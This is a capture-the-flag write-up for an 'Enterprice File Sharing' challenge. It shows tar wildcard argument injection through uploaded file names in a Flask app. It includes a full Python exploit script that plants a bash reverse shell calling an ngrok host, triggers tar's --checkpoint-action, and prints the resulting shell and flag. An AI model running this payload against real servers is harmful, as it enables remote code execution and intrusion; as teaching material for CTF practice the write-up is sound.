<h1>Enterprice File Sharing</h1>

<h2>Description</h2>

<blockquote>
  <p>For security reasons we only use enterprice grade cloud storage.</p>
</blockquote>

<p>{% file src="../../.gitbook/assets/EFS.tar.gz" %}</p>

<h2>Solution</h2>

<h3>Code Review</h3>

<p>This, for the most part, seems like a standard file hosting site. Let's take a look at the validation.</p>

<p>First, uploaded files must have one of the allowed extensions.</p>

<p>```python</p>

<h1>We only allow files for serious business use-cases</h1>

<p>ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'}</p>

<p>def allowed<em>file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED</em>EXTENSIONS
```</p>

<p>We also see that steps have been taken to normalize the file paths, to prevent directory traversal attacks using <code>../</code>.</p>

<p>```python
def normalize<em>file(filename):
    return filename.replace("..", "</em>")</p>

<p>...</p>

<p>@app.route('/upload', methods=["POST"])
def upload():
    if "ID" not in session:
        return redirect("/")</p>

<pre><code>if 'file' not in request.files:
    flash('No file part')
    return redirect("/")
file = request.files['file']

if file.filename == '':
    flash('No file selected')
    return redirect(request.url)

if file and allowed_file(file.filename):
    f_content = file.stream.read()
    if len(f_content) &gt; 1024:
        flash("Your file is too big! Buy premium to upload bigger files!")
        return redirect('/')
    filename = normalize_file(file.filename)
    with open(os.path.join(SESS_BASE_DIR, session["ID"], filename), "wb") as f:
        f.write(f_content)
        print(os.path.join(SESS_BASE_DIR, session["ID"], filename))
    return redirect("/")
else:
    flash("Invalid file type submitted!")
    return redirect('/')

return redirect("/")
</code></pre>

<p>```</p>

<p>What seems out of the ordinary, though, is the use of <code>os.system()</code> to execute a <code>tar</code> command when the user requests to download all uploaded files. Surely there's a library for that!</p>

<p>```python
@app.route('/download<em>all')
def download</em>all():
    if "ID" not in session:
        return redirect("/")</p>

<pre><code>sess_id = session["ID"]
sess_dir = os.path.join(SESS_BASE_DIR, sess_id)

res = os.system(f"cd {sess_dir} &amp;&amp; tar czf /tmp/{sess_id}.tgz *")
if res != 0:
    flash("Something went wrong.")
    return redirect("/")
return send_file(f"/tmp/{sess_id}.tgz", attachment_filename=f"{sess_id}.tgz")
</code></pre>

<p>```</p>

<h3>Wildcard Injection</h3>

<p>I decided to pay closer attention to the system command: <code>cd {sess_dir} &amp;&amp; tar czf /tmp/{sess_id}.tgz *</code>.</p>

<p>A bit of research led me to a few very interesting papers, one of which was <a href="https://www.exploit-db.com/papers/33930">this</a>. Apparently, this is a class of Unix vulnerabilities where wildcards in commands can be abused to inject arguments!</p>

<p>For instance, if you have a file named <code>-rf</code>, and you execute <code>rm *</code>, the wildcard gets substituted with <code>-rf</code>, which is interpreted as a command line argument!</p>

<p><code>
[root@defensecode public]# ls -al
total 20
drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file3.txt
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
[root@defensecode public]# rm *
[root@defensecode public]# ls -al
total 8
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
</code></p>

<p>Now, how can we abuse this in our use case? In <code>tar</code>, there is a <code>--checkpoint-action</code> option that will specify which program will be executed when a "checkpoint" is reached.</p>

<p>A common payload to exploit this would be two files:</p>

<ul>
<li><code>--checkpoint-action=exec=sh shell.sh</code></li>
<li><code>--checkpoint=1</code></li>
</ul>

<p>Now, the first file and the script are no problem - we can use <code>--checkpoint-action=exec=sh shell.txt</code> to perform argument pollution, which works because this ends with <code>.txt</code>.</p>

<p>We cannot use <code>checkpoint=1</code> , though, because this wonâ€™t pass the extension check.</p>

<p>Looking a bit more into the Tar manual, I saw that the default checkpoint number is 10, which means that the checkpoint action is performed every 10 records.</p>

<p><img src="../../.gitbook/assets/image (80) (1) (1).png" alt="" /></p>

<p>But how big is each record? Apparently, it's 20 512-byte blocks.</p>

<p><img src="../../.gitbook/assets/image (82) (1).png" alt="" /></p>

<p>So if we upload enough bytes, our tar archive will eventually exceed 10 records * 20 blocks * 512 bytes = 102400 bytes. Once that happens, we would have 10 records within the tar archive and the checkpoint action will be executed.</p>

<p>```python
import requests
import os</p>

<p>s = requests.session()</p>

<p>s.get("http://efs.rumble.host/")</p>

<p>with open("shell.txt", 'w') as f:
    f.write("bash -c \"bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/12843 0>&amp;1\"")</p>

<p>with open("--checkpoint-action=exec=sh shell.txt", "w") as f:
    f.write("")</p>

<p>s.post("http://efs.rumble.host/upload",
    files = {"file": open("shell.txt", 'rb')}
)</p>

<p>s.post("http://efs.rumble.host/upload",
    files = {"file": open("--checkpoint-action=exec=sh shell.txt", 'rb')}
)</p>

<h1>Default record size for tar = 512 bytes * 20 = 10240 bytes</h1>

<h1>Default checkpoint is 10 records</h1>

<p>curr_bytes = 0
filename = 'a'</p>

<p>while curr_bytes &lt; 10240 * 10:</p>

<pre><code>with open(filename + ".txt", 'wb') as f:
    f.write(os.urandom(1024))

r = s.post("http://efs.rumble.host/upload",
    files = {"file": open(filename + ".txt", 'rb')}
)

print("Uploaded", filename + ".txt")
filename += 'a'

os.system("tar czf test.tgz a*.txt")
with open("test.tgz", 'rb') as f:
    curr_bytes = len(f.read())
    print(f"Currently at {curr_bytes} bytes")
</code></pre>

<p>s.get("http://efs.rumble.host/download<em>all")
print(s.cookies.get</em>dict())
```</p>

<p>Once we request <code>/download_all</code> and the <code>tar</code> command is run, we get a shell.</p>

<p><code>
gunicorn@8d66a32a984a:/$ cat flag.txt
cat flag.txt
CSR{shellscanbeannoying_greetsfromabudhabikek}
gunicorn@8d66a32a984a:/$
</code></p>
